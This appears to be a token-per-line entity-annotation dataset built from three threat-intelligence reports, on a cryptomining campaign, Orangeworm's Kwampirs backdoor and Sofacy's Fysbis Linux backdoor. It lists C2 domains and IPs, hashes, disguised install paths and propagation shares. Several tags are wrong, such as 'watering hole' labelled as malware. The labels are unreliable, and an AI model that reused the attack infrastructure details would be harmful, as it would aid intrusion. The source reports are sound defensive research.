09fa626ac488bca48d94c9774d6ae37d9d1d52256c807b6341f0a08bdd722abf B_hash

r2r2-m

908a91a707a3a47f9d4514ecdb9e43de861ffa79c40202f0f72b4866fb6c23a6 B_hash

r345

51f9b87efd00d3c12e4d73524e9626bfeed0f4948781a6f38a7301b102b8dbbd B_hash

r345-a

cfb8f536c7019d4d04fb90b7dce8d7eefaa6a862a85c523d869912a1fbaf946a B_hash

r345-m

88d03f514b2c36e06fd3b7ed6e53c7525a8e8370c4df036b3b96a6da82c8b45b B_hash

xm111

b070d06a3615f3db67ad3beab43d6d21f3c88026aa2b4726a93df47145cd30ec B_hash

z.exe

7e6cadbfad7147d78fae0716cadb9dcb1de7c4a392d8d72551c5301abe11f2b2 B_hash

a0a52dc6cf98ad9c9cb244d810a22aa9f36710f21286b5b9a9162c850212b160 B_hash

pro-wget

a09248f3a4d7e58368a1847f235f0ceb52508f29067ad27a36a590dc13df4b42 B_hash

pro-s2

3e5b3a11276e39821e166b5dbf6414003c1e2ecae3bdca61ab673f23db74734b B_hash

Domains

startreceive[.]tk B_url.unknown

stats.startreceive[.]tk B_url.unknown
(
traffic
redirection
)

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

wp.startreceive[.]tk B_url.unknown
(
C&C
)

roi777.com B_url.normal
minexmr.com B_url.normal

Emails
richard.melony[]openmailbox[]org

185.212.128.154 B_ip.unknown

Tags
:
cryptocurrency
mining
,
cyber
attack
,
malware

COMMENT

Loki

June
6
,
2018
at
9:32
am

hot
shit

Reply

Leave
a
Comment

Want
to
join
the
discussion
?

Feel
free
to
contribute
!

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Name
*

Email
*

POST
COMMENT

LATEST
POSTS

AZURE
PASSWORDS
ARE
STILL
AT
RISK
;
INFECTION
MONKEY
CAN
HELP

RECOVERING
PLAINTEXT
PASSWORDS
FROM
AZURE
VIRTUAL
MACHINES
LIKE
IT'S
THE
1990S

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

<-
Back
to
Guardicore
Labs

HOME
|
PRODUCT
|
USE
CASES
|
PARTNERS
|
COMPANY
|
RESOURCES
|
BLOG
|
SUPPORT
|
NEWS
&
PRESS
|
CONTACT
US
|
CUSTOMER
PORTAL
|
TERMS
OF
USE
|
PRIVACY
POLICY
|
LABS

©
2018
GuardiCore

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!
Blogs
Threat
Intelligence

Menu

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Security
Response
Attack
Investigation
Team

POSTED
:
MIN
READ

THREAT
INTELLIGENCE

Symantec
has
identified
a
previously
unknown
group
called
Orangeworm B_malware.infosteal
that
has
been
observed
installing
a
custom
backdoor
called
Trojan.Kwampirs  B_malware.backdoor
within
large
international
corporations
that
operate
within
the
healthcare
sector
in
the
United
States
,
Europe
,
and
Asia
.

First
identified
in
January
2015
,
Orangeworm B_malware.infosteal
has
also
conducted
targeted
attacks
against
organizations
in
related
industries
as
part
of
a
larger
supply-chain
attack
in
order
to
reach
their
intended
victims
.

Known
victims
include
healthcare
providers
,
pharmaceuticals
,
IT
solution
providers
for
healthcare
and
equipment
manufacturers
that
serve
the
healthcare
industry
,
likely
for
the
purpose
of
corporate
espionage
.

'
Orangeworm B_malware.infosteal
installs
the
Kwampirs B_malware.backdoor
custom
backdoor
in
large
firms
in
the
healthcare
sector
in
the
U.S.
,
Europe
&
Asia
.
https://symc.ly/2K1oJjU B_url.normal
'

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

CLICK
TO
TWEET

Sights
set
on
healthcare

Based
on
the
list
of
known
victims
,
Orangeworm B_malware.infosteal
does
not
select
its
targets
randomly
or
conduct
opportunistic
hacking
.

Rather
,
the
group
appears
to
choose
its
targets
carefully
and
deliberately
,
conducting
a
good
amount
of
planning
before
launching
an
attack
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Figure
1
.
Nearly
40
percent
of
Orangeworm's B_malware.infosteal
victims
operate
within
the
healthcare
industry

According
to
Symantec
telemetry
,
almost
40
percent
of
Orangeworm's B_malware.infosteal
confirmed
victim
organizations
operate
within
the
healthcare
industry
.

The
Kwampirs B_malware.backdoor
malware
was
found
on
machines
which
had
software
installed
for
the
use
and
control
of
high-tech
imaging
devices
such
as
X-Ray
and
MRI
machines
.

Additionally
,
Orangeworm B_malware.infosteal
was
observed
to
have
an
interest
in
machines
used
to
assist
patients
in
completing
consent
forms
for
required

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

procedures
.

The
exact
motives
of
the
group
are
unclear
.

Figure
2
.
The
biggest
number
of
Orangeworm's B_malware.infosteal
victims
are
located
in
the
U.S.

The
biggest
number
of
Orangeworm's B_malware.infosteal
victims
are
located
in
the
U.S.
,
accounting
for
17
percent
of
the
infection
rate
by
region
.

While
Orangeworm B_malware.infosteal
has
impacted
only
a
small
set
of

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

victims
in
2016
and
2017
according
to
Symantec
telemetry
,
we
have
seen
infections
in
multiple
countries
due
to
the
nature
of
the
victims
operating
large
international
corporations
.

The
biggest
number
of
Orangeworm's B_malware.infosteal
victims
are
located
in
the
U.S.
,
accounting
for
17
percent
of
the
infection
rate
by
region
.

Healthcare
providers
caught
in
the
crosshairs

We
believe
that
these
industries
have
also
been
targeted
as
part
of
a
larger
supply-chain
attack
in
order
for
Orangeworm B_malware.infosteal
to
get
access
to
their
intended
victims
related
to
healthcare
.

Orangeworm's B_malware.infosteal
secondary
targets
include
Manufacturing
,
Information
Technology
,
Agriculture
,
and
Logistics
.

While
these
industries
may
appear
to
be
unrelated
,
we
found
them
to
have
multiple
links
to
healthcare
,
such
as
large
manufacturers
that
produce
medical
imaging
devices
sold
directly
into
healthcare
firms
,
IT
organizations
that
provide
support
services
to
medical
clinics
,
and
logistical
organizations
that
deliver

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

healthcare
products
.

Post-compromise
activities

Once
Orangeworm B_malware.infosteal
has
infiltrated
a
victim's
network
,
they
deploy
Trojan.Kwampirs  B_malware.backdoor
,
a
backdoor
Trojan
that
provides
the
attackers
with
remote
access
to
the
compromised
computer
.

When
executed
,
Kwampirs B_malware.backdoor
decrypts
and
extracts
a
copy
of
its
main
DLL
payload
from
its
resource
section
.

Before
writing
the
payload
to
disk
,
it
inserts
a
randomly
generated
string
into
the
middle
of
the
decrypted
payload
in
an
attempt
to
evade
hash-based
detections
.

To
ensure
persistence
,
Kwampirs B_malware.backdoor
creates
a
service
with
the
following
configuration
to
ensure
that
the
main
payload
is
loaded
into
memory
upon
system
reboot
:

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

The
backdoor
also
collects
some
rudimentary
information
about
the
compromised
computer
including
some
basic
network
adapter
information
,
system
version
information
,
and
language
settings
.

Orangeworm B_malware.infosteal
likely
uses
this
information
to
determine
whether
the
system
is
used
by
a
researcher
or
if
the
victim
is
a
high-value
target
.

Once
Orangeworm B_malware.infosteal
determines
that
a
potential
victim
is
of
interest
,
it
proceeds
to
aggressively
copy
the
backdoor
across
open
network
shares
to
infect
other
computers
.

It
may
copy
itself
to
the
following
hidden
file
shares
:

ADMIN$

C$WINDOWS

D$WINDOWS

E$WINDOWS

Information
gathering

At
this
point
,
the
attackers
proceed
to
gather
as
much
additional
information
about
the
victim's
network
as
possible
,
including
any
information
pertaining
to
recently
accessed

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

computers
,
network
adapter
information
,
available
network
shares
,
mapped
drives
,
and
files
present
on
the
compromised
computer
.

We
have
observed
the
attackers
executing
the
following
commands
within
victim
environments
:

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

No
concern
about
being
discovered

Kwampirs B_malware.backdoor
uses
a
fairly
aggressive
means
to
propagate
itself
once
inside
a
victim's
network
by
copying
itself
over
network
shares
.

While
this
method
is
considered
somewhat
old
,
it
may
still
be
viable
for
environments
that
run
older
operating
systems
such
as
Windows
XP
.

This
method
has
likely
proved
effective
within
the
healthcare
industry
,
which
may
run
legacy
systems
on
older
platforms
designed
for
the
medical
community
.

Older
systems
like
Windows
XP
are
much
more
likely
to
be
prevalent
within
this
industry
.

Additionally
,
once
infected
,
the
malware
cycles
through
a
large
list
of
command
and
control

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

(
C&C
)
servers
embedded
within
the
malware
.

It
appears
while
the
list
is
extensive
,
not
all
of
the
C&Cs
are
active
and
continue
to
beacon
until
a
successful
connection
is
established
.

Despite
modifying
a
small
part
of
itself
while
copying
itself
across
the
network
as
a
means
to
evade
detection
,
the
operators
have
made
no
effort
to
change
the
C&C
communication
protocol
since
its
first
inception
.

Both
of
these
methods
are
considered
particularly
'
noisy
'
and
may
indicate
that
Orangeworm B_malware.infosteal
is
not
overly
concerned
with
being
discovered
.

The
fact
that
little
has
changed
with
the
internals
of
Kwampirs B_malware.backdoor
since
its
first
discovery
may
also
indicate
that
previous
mitigation
methods
against
the
malware
have
been
unsuccessful
,
and
that
the
attackers
have
been
able
to
reach
their
intended
targets
despite
defenders
being
aware
of
their
presence
within
their
network
.

Kwampirs B_malware.backdoor
uses
a
fairly
aggressive
means
to
propagate
itself
once
inside
a
victim's
network
by
copying
itself
over
network
shares
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

No
hallmarks
of
a
nation
-
state
actor

While
Orangeworm B_malware.infosteal
is
known
to
have
been
active
for
at
least
several
years
,
we
do
not
believe
that
the
group
bears
any
hallmarks
of
a
state
-
sponsored
actor
—
it
is
likely
the
work
of
an
individual
or
a
small
group
of
individuals
.

There
are
currently
no
technical
or
operational
indicators
to
ascertain
the
origin
of
the
group
.

Protection

Symantec
customers
are
protected
against
Orangeworm B_malware.infosteal
and
Symantec
has
also
made
efforts
to
notify
identified
targets
of
its
operations
.

Customers
with
Intelligence
Services
or
WebFilter-enabled
products
are
protected
against
activity
associated
with
the
Orangeworm B_malware.infosteal
group
.

These
products
include
:

Web
Security
Service
(
WSS
)

ProxySG

Advanced
Secure
Gateway
(
ASG
)

Security
Analytics

Content
Analysis

Malware
Analysis

SSL
Visibility

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

PacketShaper

Symantec
has
the
following
specific
detections
in
place
for
tools
used
by
Orangeworm B_malware.infosteal
:

Anti-virus
(
AV
)
:

Trojan.Kwampirs  B_malware.backdoor

Intrusion
prevention
system
(
IPS
)
:

System
Infected
:
Trojan.Kwampirs  B_malware.backdoor
Activity

System
Infected
:
Trojan.Kwampirs  B_malware.backdoor
Activity
2

System
Infected
:
Trojan.Kwampirs  B_malware.backdoor
Activity
4

Indicators
of
Compromise

File
Attachments

Indicators
of
Compromise
for
Orangeworm B_malware.infosteal

PDF

556.65
KB

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

About
the
Author

Security
Response
Attack
Investigation
Team

The
Attack
Investigation
Team
is
a
group
of
security
experts
within
Symantec
Security
Response
whose
mission
is
to
investigate
targeted
attacks
,
drive
enhanced
protection
in
Symantec
products
,
and
offer
analysis
which
helps
customers
respond
to
attacks
.

Want
to
comment
on
this
post
?

We
encourage
you
to
share
your
thoughts
on
your
favorite
social
platform
.

Related
Blog
Posts

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

POSTED
:
20
MIN
READ

POSTED
:
2
MIN
READ

Microsoft
Patch
Tuesday
–
April
2018

Latest
Intelligence
for
March
2018

POSTED
:
0
MIN
READ

Browser-based
coin
mining
without
a
browser
?

POSTED
:
4
MIN
READ

ISTR
23
:
Insights
into
the
Cyber
Security
Threat
Landscape

Contact
Us

Terms
of
Use

Privacy
&
Cookies

©
2017
Symantec
Corporation

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!
A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

Search
4/3/2016

Home

Blog
Home

Applipedia

Threat
Vault

Reports

Tools

English

1.866.320.4788

Support

Resources

Research

Search

Like

Tweet

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor

posted
by
:
Bryan
Lee
and
Rob
Downs
on
February
12
,
2016
3:00
PM

filed
in
:
Malware
,
Threat
Prevention
,
Unit
42

tagged
:
Fysbis B_malware.backdoor
,
Linux
,
Sofacy

Introduction

The
Sofacy
group
,
also
known
as
APT28
and
Sednit
,
is
a
fairly
well
known
cyber
espionage
group
believed
to
have
ties
to
Russia
.

Their
targets
have
spanned
all
across
the
world
,
with
a
focus
on
government
,
defense
organizations
and
various
Eastern
European
governments
.

There
have
been
numerous
reports
on
their
activities
,
to
the
extent
that
a
Wikipedia
entry
has
even
been
created
for
them
.

From
these
reports
,
we
know
that
the
group
uses
an
abundance
of
tools
and
tactics
,
ranging
across
zero­day
exploits
targeting
common
applications
such
as
Java
or
Microsoft
Office
,
heavy
use
of
spear­phishing
attacks
,
compromising
legitimate
websites
to
stage
watering B_malware.backdoor
- I
­hole I
attacks
,
and
targeting
over
a
variety
of
operating
systems
–
Windows
,
OSX
,
Linux
,
even
mobile
iOS
.

The
Linux
malware
Fysbis B_malware.backdoor
is
a
preferred
tool
of
Sofacy
,
and
though
it
is
not
particularly
sophisticated
,
Linux
security
in
general
is
still
a
maturing
area
,
especially
in
regards
to
malware
.

In
short
,
it
is
entirely
plausible
that
this
tool
has
contributed
to
the
success
of
associated
attacks
by
this
group
.

This
blog
post
focuses
specifically
on
this
Linux
tool
preferred
by
Sofacy
and
describes
considerations
and
implications
when
it
comes
to
Linux
malware
.

Malware
Assessment

Fysbis B_malware.backdoor
is
a
modular
Linux
trojan
/
backdoor
that
implements
plug­in
and
controller
modules
as
distinct
classes
.

For
reference
,
some
vendors
categorize
this
malware
under
the
Sednit
attacker
group
naming
designation
.

This
malware
includes
both
32­bit
and
64­bit
versions
of
Executable
and
Linking
Format
(
ELF
)
binaries
.

Additionally
,
Fysbis B_malware.backdoor
can
install
itself
to
a
victim
system
with
or
without
root
privileges
.

This
increases
the
options
available
to
an
adversary
when
it
comes
to
selecting
accounts
for
installation
.

Summary
information
for
the
three
binaries
we
analyzed
follows
:

SHA­256

ssdeep

364ff454dcf00420cff13a57bcb78467 B_hash

8bca0031f3b691421cb15f9c6e71ce19335 B_hash

5d2d8cf2b190438b6962761d0c6bb B_hash

3072:n+1R4tREtGN4qyGCXdHPYK9l0H786

O26BmMAwyWMn/qwwiHNl:n+1R43QcIL

XdF0w6IBmMAwwCwwi

141.2
KB
(
144560
bytes
)

ELF
64­bit
(
stripped
)
/bin/rsyncd

Size

Type

Install
as
root

http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/ B_url.normal

1/10

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog
synchronize
and
backup
service

4/3/2016

Root
install
desc

Install
as
non­root

~/.config/dbus­notifier/dbus­inotifier

Non­root
install
desc

Usage
Timeframe

azureon­line[.]com B_ip.unknown
(
TCP/80
)

Late
2014

system
service
d­bus
notifier

Table
1
:
Sample
1
–
Late
2014
Sofacy
64­bit
Fysbis B_malware.backdoor

SHA­256

ssdeep

075b6695ab63f36af65f7ffd45cccd39 B_hash

02c7cf55fd5c5809ce2dce56085ba43795f2 B_hash

480423a4256537bfdfda0df85592 B_hash

3072:9ZAxHANuat3WWFY9nqjwbuZf454U

NqRpROIDLHaSeWb3LGmPTrIW33HxIajF
:

9ZAxHANJAvbuZf454UN+rv
eQLZPTrV3Z

175.9
KB
(
180148
bytes
)

ELF
32­bit
(
stripped
)

/bin/ksysdefd

system
kernel
service
defender

Size

Type

Install
as
root

Root
install
desc

Install
as
non­-root
~/.config/ksysdef/ksysdefd

Non­-root
install
desc

Usage
Timeframe

Early
2015

198.105.125[.]74 B_ip.unknown
(
TCP/80
)

system
kernel
service
defender

SHA­256

ssdeep

e107c5c84ded6cd9391aede7f04d64c8 B_hash

fd8b2ea9a2e8a67e4cb3904b49c789d57ed B_hash

9b1ce5bebfe54fe3d98214d6a0f61 B_hash

6144:W/D5tpLWtr91gmaVy+mdckn6BCUd

c4mLc2B9:4D5Lqgkcj+

314.4
KB
(
321902
bytes
)

ELF
64­bit
(
not
stripped
)

/bin/ksysdefd

system
kernel
service
defender

Size

Type

Install
as
root

Root
install
desc

Install
as
non­root

~/.config/ksysdef/ksysdefd

Non­root
install
desc

Usage
Timeframe

mozilla­plugins[.]com B_url.unknown
(
TCP/80
)

Late
2015

system
kernel
service
defender

Table
2
:
Sample
2
–
Early
2015
Sofacy
32­bit
Fysbis B_malware.backdoor

Table
3
:
Sample
3
–
Late
2015
Sofacy
64­bit
Fysbis B_malware.backdoor

Overall
,
these
binaries
are
assessed
as
low
sophistication
,
but
effective
.

They
epitomize
the
grudging
reality
that
Advanced
Persistent
Threat
(
APT
)
actors
often
don't
require
advanced
means
to
affect
their
objectives
.

Rather
,
these
actors
more
often
than
not
hold
their
advanced
malware
and
zero
day
exploits
in
reserve
and
employ
just
enough
resources
to
meet
their
goals
.

It
is
only
fair
that
defenders
use
any
shortcuts
or
tricks
at
their
disposal
to
shorten
the
amount
of
time
it
takes
to
assess
threats
.

In
other
words
,
defenders
should
always
look
for
ways
to
work
smarter
before
they
have
to
work
harder
.

Getting
the
Most
Out
of
Strings

Binary
strings
alone
revealed
a
good
amount
about
these
files
,
increasing
the
efficacy
of
activities
such
as
static
analysis
categorization
(
e.g.
,
Yara
)
.

One
example
of
this
is
Fysbis B_malware.backdoor
installation
and
platform
targeting
information
for
the
samples
in
Table
1
and
Table
2
.

Figure
1
:
Sofacy
Fysbis B_malware.backdoor
installation
and
platform
targeting
found
in
strings

In
this
case
,
we
can
see
the
binary
installation
path
and
local
reconnaissance
to
determine
which
flavor
of
Linux
the
malware
is
running
.

This
is
followed
by
a
number
of
Linux
shell
command
style
commands
related
to
the
malware
establishing
persistence
.

Another
example
of
easily
obtained
information
from
these
samples
is
capability
based
.

http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/ B_url.normal

2/10

4/3/2016

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

Figure
2
:
Sofacy
Fysbis B_malware.backdoor
capability
related
leakage
through
strings

Figure
2
shows
interactive
status
/
feedback
strings
that
can
give
a
defender
an
initial
profile
of
capabilities
.

In
addition
to
contributing
to
static
analysis
detections
,
this
can
be
useful
as
a
starting
point
for
further
incident
response
prioritization
and
qualification
of
the
threat
.

Symbolic
Information
Can
Shorten
Analysis
Time

Interestingly
,
the
most
recent
ELF
64­bit
binary
we
analyzed
(
Table
3
)
was
not
stripped
prior
to
delivery
,
which
offered
additional
context
in
the
form
of
symbolic
information
.

Defenders
more
familiar
with
Windows
Portable
Executable
(
PE
)
binaries
can
equate
this
with
compilation
of
a
Debug
version
versus
a
Release
version
.

For
comparison
,
if
we
were
to
inspect
Fysbis B_malware.backdoor
'
RemoteShell
'
associated
strings
in
one
of
the
stripped
variants
,
we
would
only
see
the
following
:

Compare
this
with
what
is
available
from
the
non­stripped
variant
:

Figure
3
:
Sofacy
Fysbis B_malware.backdoor
stripped
binary
string
references
to
RemoteShell
capability

http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/ B_url.normal

3/10

4/3/2016

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

Figure
4
:
Sofacy
Fysbis B_malware.backdoor
non­stripped
binary
strings
referenes
to
RemoteShell
capability

Little
static
analysis
gifts
like
these
can
help
to
speed
defender
enumeration
of
capabilities
and
–
more
importantly
–
further
contribute
to
correlation
and
detection
across
related
samples
.

Additionally
,
this
latest
sample
demonstrated
minor
evolution
of
the
threat
,
most
notably
in
terms
of
obfuscation
.

Specifically
,
both
samples
in
Table
1
and
Table
2
leaked
installation
information
in
the
clear
within
binary
strings
.

This
was
not
the
case
with
the
sample
in
Table
3
.

Taking
a
closer
look
at
this
non­stripped
binary
using
a
disassembler
,
the
following
corresponds
to
decoding
malware
installation
information
for
a
root­privilege
account
.

In
this
case
,
the
symbolic
information
hints
at
the
method
used
for
decoding
,
with
references
to
mask
,
path
,
name
,
and
info
byte
arrays
.

Figure
5
:
Assembly
code
view
of
Sample
3
installation
decoding

Figure
6
:
Assembly
view
of
Sample
3
root
installation
related
byte
arrays

As
it
turns
out
,
the
referenced
byte
mask
is
applied
to
the
other
byte
arrays
using
a
rolling
double­XOR
algorithm
to
construct
malware
installation
paths
,
filenames
,
and
descriptions
for
a
Linux
root
account
.

Corresponding
INSTALLUSER
byte
arrays
exist
,
which
facilitate
the
non­root
installation
for
the
trojan
.

The
same
masking
method
is
also
used
by
the
binary
to
decode
malware

http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/ B_url.normal

4/10

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

4/3/2016

configuration
C2
information
,
further
showcasing
how
a
little
symbolic
information
can
go
a
long
way
towards
completeness
and
higher
confidence
in
assessment
of
a
malware
sample
.

If
you
would
like
to
learn
more
about
how
Fysbis B_malware.backdoor
works
,
the
samples
analyzed
remain
fairly
consistent
with
the
sample
analysis
found
here
.

Infrastructure
Analysis

As
Unit
42
has
discussed
in
depth
in
other
blog
articles
,
we
have
observed
that
adversaries
in
general
are
seemingly
hesitant
in
changing
their
infrastructure
.

This
may
be
due
to
not
wanting
to
commit
additional
resources
,
or
simply
a
matter
of
retaining
familiarity
for
the
sake
of
timeliness
.

In
either
case
,
we
see
the
same
type
of
behavior
here
with
the
Fysbis B_malware.backdoor
samples
in
use
by
Sofacy
.

The
oldest
sample
(
Table
1
)
,
was
found
to
beacon
to
the
domain
azureon­line[.]com
,
which
had
already
been
widely
publicized
as
a
known
command
and
control
domain
for
the
Sofacy
group
.

Using
passive
DNS
,
we
can
see
that
two
of
the
original
IPs
this
domain
resolved
to
,
193.169.244[.]190
and
111.90.148[.]148
also
mapped
to
a
number
of
other
domains
that
had
been
in
use
by
the
Sofacy
group
during
that
time
period
.

The
first
of
the
newer
samples
(
Table
2
)
,
continues
the
trend
and
beacons
to
an
IP
also
widely
associated
with
the
Sofacy
group
,
198.105.125[.]74
.

This
IP
has
been
mostly
associated
with
the
tool
specifically
known
as
CHOPSTICK
,
which
can
be
read
about
here
.

Figure
7
:
Sample
1
C2
resolutions

http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/ B_url.normal

5/10

4/3/2016

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

The
newest
sample
(
Table
3
)
,
introduces
a
previously
unknown
command
and
control
beacon
to
mozilla­plugins[.]com
.

This
activity
aligns
with
the
previously
observed
Sofacy
group
tactic
of
integrating
legitimate
company
references
into
their
infrastructure
naming
convention
.

Neither
this
new
domain
nor
the
IP
it
resolves
to
have
been
observed
in
the
past
,
indicating
that
the
sample
in
Table
3
may
be
associated
with
a
newer
campaign
.

Comparing
this
sample's
binary
with
the
other
two
however
,
shows
there
are
significant
similarities
on
the
code
level
as
well
as
in
terms
of
shared
behavior
.

Figure
8
:
Sample
2
C2
resolutions

Figure
9
:
Sample
3
C2
resolutions

Conclusion

Linux
is
used
across
business
and
home
environments
and
appears
in
a
variety
of
form
factors
.

It
is
a
preferred
platform
within
data
centers
and
the
cloud
for
businesses
,
as
well
as
an
ongoing
favorite
when
it
comes
to
a
majority
of
Internet­facing
web
and
application
servers
.

Linux
is
also
at
the
foundation
of
Android
devices
and
a
number
of
other
embedded
systems
.

The
value
proposition
of
Linux
–
especially
when
it
comes
to
its
use
in
the
enterprise
–
can
be
broken
out
into
three
perceived
benefits
:
lower
total
cost
of
ownership
(
TCO
)
,
security
,
and
feature
set
.

While
numbers
and
comparison
alone
can
contribute
to
measurement
of
TCO
and
feature
set
,
security
requires
further
qualification
.

Expertise
in
the
Linux
platform
is
highly
sought
after
across
all
industries
for
multiple
disciplines
,
from
system
administration
to
big
data
analytics
to
incident
response
.

The
majority
of
businesses
still
maintain
Windows­heavy
user
environments
where
certain
core
infrastructure
components
also
operate
under
Windows
servers
(
e.g.
,
Active
Directory
,
SharePoint
,
etc
.
)
.

This
means
,
from
a
practical
perspective
,
most
of
a
business's
focus
remains
on
supporting
and
protecting
Windows
assets
.

Linux
remains
a
mystery
to
a
number
of
enterprise
IT
specialists
–most
critically
for
network
defenders
.

Identifying
and
qualifying
potential
incidents
requires
a
familiarity
with
what

http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/ B_url.normal

6/10

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

4/3/2016

constitutes
normal
operation
in
order
to
isolate
anomalies
.

The
same
is
true
for
any
other
asset
in
an
environment
,
normal
operation
is
entirely
dependent
on
a
given
asset's
role
/
function
in
the
enterprise
.

Lack
of
expertise
and
visibility
into
non­Windows
platforms
combine
in
some
environments
to
present
significant
risks
against
an
organization's
security
posture
.

As
a
recent
caution
,
the
Linux
vulnerability
described
under
CVE­2016­0728
further
demonstrates
the
potential
breadth
of
real­world
risks
to
associated
platforms
.

A
natural
extension
of
this
exposure
is
increased
targeting
by
both
dedicated
and
opportunistic
attackers
across
various
malicious
actor
motivations
.

Despite
the
lingering
belief
(
and
false
sense
of
security
)
that
Linux
inherently
yields
higher
degrees
of
protection
from
malicious
actors
,
Linux
malware
and
vulnerabilities
do
exist
and
are
in
use
by
advanced
adversaries
.

To
mitigate
associated
risks
requires
tailored
integration
of
the
people
,
processes
,
and
technology
in
support
of
prevention
,
monitoring
,
and
detection
within
an
environment
.

Linux
malware
detection
and
prevention
is
not
prevalent
at
this
time
,
but
Palo
Alto
Networks
customers
are
protected
through
our
next­generation
security
platform
:

IPS
signature
14917
deployed
to
identify
and
prevent
command
and
control
activity

The
C2
domains
and
files
mentioned
in
this
report
are
blocked
in
our
Threat
Prevention
product
.

Indicators

Type

SHA256

Value

364ff454dcf00420cff13a57bcb78467 B_hash

8bca0031f3b691421cb15f9c6e71ce193 B_hash

355d2d8cf2b190438b6962761d0c6bb B_hash

3072:n+1R4tREtGN4qyGCXdHPYK9l

0H786O26BmMAwyWMn/qwwiHNl:n

+1R43QcILXdF0w6IBmMAwwCwwi

075b6695ab63f36af65f7ffd45cccd39 B_hash

02c7cf55fd5c5809ce2dce56085ba437 B_hash

95f2480423a4256537bfdfda0df85592 B_hash

3072:9ZAxHANuat3WWFY9nqjwbuZf

454UNqRpROIDLHaSeWb3LGmPTrI

W33HxIajF:9ZAxHANJAvbuZf454UN

+rv
eQLZPTrV3Z

e107c5c84ded6cd9391aede7f04d64c8 B_hash

fd8b2ea9a2e8a67e4cb3904b49c789d B_hash

57ed9b1ce5bebfe54fe3d98214d6a0f61 B_hash

6144:W/D5tpLWtr91gmaVy+mdckn6

BCUdc4mLc2B9:4D5Lqgkcj+

/bin/rsyncd

synchronize
and
backup
service

~/.config/dbus­notifier/dbus­inotifier

system
service
d­bus
notifier

/bin/ksysdefd

~/.config/ksysdef/ksysdefd

system
kernel
service
defender

azureon­line[.]com B_url.unknown

198.105.125[.]74 B_ip.unknown

mozilla­plugins[.]com B_url.unknown

Mozillaplagins[.]com B_url.unknown

27
Pingbacks
&
Trackbacks

February
13
,
2016
5:13
AM

The
Fysbis B_malware.backdoor
Linux
Backdoor
Used
By
Russian
Hackers
­-
BitsHacker

February
13
,
2016
1:09
PM

Fysbis B_malware.backdoor
Linux
,
El
nuevo
BackDoor
de
la
Familia
Malware
'
Tecnoinnovador

February
14
,
2016
8:38
AM

Russian
Hackers
Spying
On
Your
Linux
PC
Using
Sophisticated
Malware
'
Fysbis B_malware.backdoor
'
|
..
:
:
Frog
in
the
box
:
:
..
|
..
:
:
Frog
in
the
box
:
:
..

February
15
,
2016
5:56
AM

Russian
cyberspy
group
uses
simple
yet
effective
Linux
Trojan
­-
GeekTechTalk

February
15
,
2016
6:04
AM

http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/ B_url.normal

7/10

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

4/3/2016

Russian
cyberspy
group
uses
simple
yet
effective
Linux
Trojan
|
Network
Hunt

February
15
,
2016
6:05
AM

Russian
cyberspy
group
uses
simple
yet
effective
Linux
Trojan
|
E­-Network
News

February
15
,
2016
7:47
AM

Russian
cyberspy
group
uses
simple
yet
effective
Linux
Trojan
-
­
February
15
,
2016
10:31
AM

|
2600
Solutions
,
LLC

February
15
,
2016
10:32
AM

Russian
cyberspy
group
uses
simple
yet
effective
Linux
Trojan
|
2600
Solutions
,
LLC

February
15
,
2016
12:17
PM

A
Look
Into
Fysbis B_malware.backdoor
:
Sofacy's
Linux
Backdoor
|
vyagers

February
15
,
2016
3:17
PM

Russian
Cyberespionage
Group
Uses
Linux
Trojan
­-
LIFARS

February
15
,
2016
5:08
PM

Ciberespías
rusos
utilizan
troyano
en
Linux
simple
y
efectivo
|
Adictec

February
15
,
2016
9:10
PM

Russian
cyberspy
group
uses
simple
yet
effective
Linux
Trojan
­-
Micro
Penguin

February
15
,
2016
9:27
